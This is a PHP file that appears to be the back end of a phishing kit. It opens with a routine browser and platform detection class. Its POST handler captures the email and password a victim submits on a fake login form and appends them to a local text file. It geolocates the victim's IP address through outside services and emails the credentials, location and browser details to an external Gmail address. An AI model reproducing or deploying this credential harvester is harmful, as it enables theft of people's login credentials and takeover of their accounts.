<?php session_start();

class BrowserDetection {

    private $_user_agent;
    private $_name;
    private $_version;
    private $_platform;

    private $_basic_browser = array (
       'Trident\/7.0' => 'Internet Explorer 11',
    'Beamrise' => 'Beamrise',
    'Opera' => 'Opera',
    'OPR' => 'Opera',
    'Shiira' => 'Shiira',
    'Chimera' => 'Chimera',
    'Phoenix' => 'Phoenix',
    'Firebird' => 'Firebird',
    'Camino' => 'Camino',
    'Netscape' => 'Netscape',
    'OmniWeb' => 'OmniWeb',
    'Konqueror' => 'Konqueror',
    'icab' => 'iCab',
     'Lynx' => 'Lynx',
    'Links' => 'Links',
    'hotjava' => 'HotJava',
    'amaya' => 'Amaya',
    'IBrowse' => 'IBrowse',
    'iTunes' => 'iTunes',
    'Silk' => 'Silk',
    'Dillo' => 'Dillo', 
    'Maxthon' => 'Maxthon',
    'Arora' => 'Arora',
    'Galeon' => 'Galeon',
    'Iceape' => 'Iceape',
    'Iceweasel' => 'Iceweasel',
    'Midori' => 'Midori',
    'QupZilla' => 'QupZilla',
    'Namoroka' => 'Namoroka',
    'NetSurf' => 'NetSurf',
    'BOLT' => 'BOLT',
    'EudoraWeb' => 'EudoraWeb',
    'shadowfox' => 'ShadowFox',
    'Swiftfox' => 'Swiftfox',
    'Uzbl' => 'Uzbl',
    'UCBrowser' => 'UCBrowser',
    'Kindle' => 'Kindle',
    'wOSBrowser' => 'wOSBrowser',
     'Epiphany' => 'Epiphany', 
    'SeaMonkey' => 'SeaMonkey',
    'Avant Browser' => 'Avant Browser',
    'Firefox' => 'Firefox',
    'Chrome' => 'Google Chrome',
    'MSIE' => 'Internet Explorer',
    'Internet Explorer' => 'Internet Explorer',
     'Safari' => 'Safari',
    'Mozilla' => 'Mozilla'  
    );

     private $_basic_platform = array(
        'windows' => 'Windows', 
     'iPad' => 'iPad', 
      'iPod' => 'iPod', 
    'iPhone' => 'iPhone', 
     'mac' => 'Apple', 
    'android' => 'Android', 
    'linux' => 'Linux',
    'Nokia' => 'Nokia',
     'BlackBerry' => 'BlackBerry',
    'FreeBSD' => 'FreeBSD',
     'OpenBSD' => 'OpenBSD',
    'NetBSD' => 'NetBSD',
     'UNIX' => 'UNIX',
    'DragonFly' => 'DragonFlyBSD',
    'OpenSolaris' => 'OpenSolaris',
    'SunOS' => 'SunOS', 
    'OS\/2' => 'OS/2',
    'BeOS' => 'BeOS',
    'win' => 'Windows',
    'Dillo' => 'Linux',
    'PalmOS' => 'PalmOS',
    'RebelMouse' => 'RebelMouse'   
     ); 

    function __construct($ua = '') {
        if(empty($ua)) {
           $this->_user_agent = (!empty($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:getenv('HTTP_USER_AGENT'));
        }
        else {
           $this->_user_agent = $ua;
        }
       }

    function detect() {
        $this->detectBrowser();
        $this->detectPlatform();
        return $this;
    }

    function detectBrowser() {
     foreach($this->_basic_browser as $pattern => $name) {
        if( preg_match("/".$pattern."/i",$this->_user_agent, $match)) {
            $this->_name = $name;
             // finally get the correct version number
            $known = array('Version', $pattern, 'other');
            $pattern_version = '#(?<browser>' . join('|', $known).')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
            if (!preg_match_all($pattern_version, $this->_user_agent, $matches)) {
                // we have no matching number just continue
            }
            // see how many we have
            $i = count($matches['browser']);
            if ($i != 1) {
                //we will have two since we are not using 'other' argument yet
                //see if version is before or after the name
                if (strripos($this->_user_agent,"Version") < strripos($this->_user_agent,$pattern)){
                    @$this->_version = $matches['version'][0];
                }
                else {
                    @$this->_version = $matches['version'][1];
                }
            }
            else {
                $this->_version = $matches['version'][0];
            }
            break;
        }
       }
   }

    function detectPlatform() {
      foreach($this->_basic_platform as $key => $platform) {
            if (stripos($this->_user_agent, $key) !== false) {
                $this->_platform = $platform;
                break;
            } 
      }
    }

   function getBrowser() {
      if(!empty($this->_name)) {
           return $this->_name;
      }
   }        

   function getVersion() {
       return $this->_version;
    }

    function getPlatform() {
       if(!empty($this->_platform)) {
          return $this->_platform;
       }
    }

    function getUserAgent() {
        return $this->_user_agent;
     }

     function getInfo() {
         return "<strong>Browser Name:</strong> {$this->getBrowser()}<br/>\n" .
        "<strong>Browser Version:</strong> {$this->getVersion()}<br/>\n" .
        "<strong>Browser User Agent String:</strong> {$this->getUserAgent()}<br/>\n" .
        "<strong>Platform:</strong> {$this->getPlatform()}<br/>";
     }
}  


if($_POST){


$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
$query2 = @json_decode(file_get_contents("https://api.ipdata.co/{$ip}"));
if($query && $query['status'] == 'success') {
  $ipDetails = 'This visitor visited from '.$query['country'].', '.$query['regionName'] .', '.$query['city'].' with IP Address of - '.$query['query'];
} else {
  $ipDetails = $ip. ' | '.@$query2->country . ' | '.@$query2->region. ' | '. @$query2->city ;

}


$id = $email = $_POST['email'];
$password = $_POST['password'];

// var_dump($_POST);
// die;

if (empty($email) || empty($password)) {
header( "Location: index.php" );
}



$msg = "<h3>Details of a login</h3>
<br>
Email Address : <b>$id</b> <br/>
Password : <b>$password</b>

<p>Time Received - ". date("d/m/Y h:i:s a") ."</p>
";


$to = "binhhnvac@gmail.com";
$subject = "Delivery Log | $email";
$headers = "From: Noreply\r\n";

$fp = fopen('ahmed.txt','a');
$savestring = $msg."\n";
fwrite($fp, $savestring);
fclose($fp);



$obj = new BrowserDetection();
//echo $obj->detect()->getInfo();

// $headers .= "Reply-To: ". strip_tags($email) . "\r\n";

$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message = '<html><body>';

$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
$message .= "<tr><td><strong>Email:</strong> </td><td>" . strip_tags($email) . "</td></tr>";
$message .= "<tr><td><strong>Subject:</strong> </td><td>" . strip_tags($subject) . "</td></tr>";
$message .= "<tr><td><strong>Message:</strong> </td><td>" . $msg . "</td></tr>";
$message .= "<tr><td><strong>IP Details:</strong> </td><td>" . $ipDetails. "</td></tr>";
// $message .= "<tr><td><strong>Where Link Is Clicked From:</strong> </td><td>" . @$_SERVER['HTTP_REFERER']. "</td></tr>";
$message .= "<tr><td><strong>Browser Details:</strong> </td><td>" . $obj->detect()->getInfo(). "</td></tr>";
$message .= "</table>";
$message .= "</body></html>";

 $send  = @mail($to, $subject, $message, $headers);
// $send2  = @mail($to2, $subject, $message, $headers);



header("Location: ");

}


die;
    


// }
  ?>
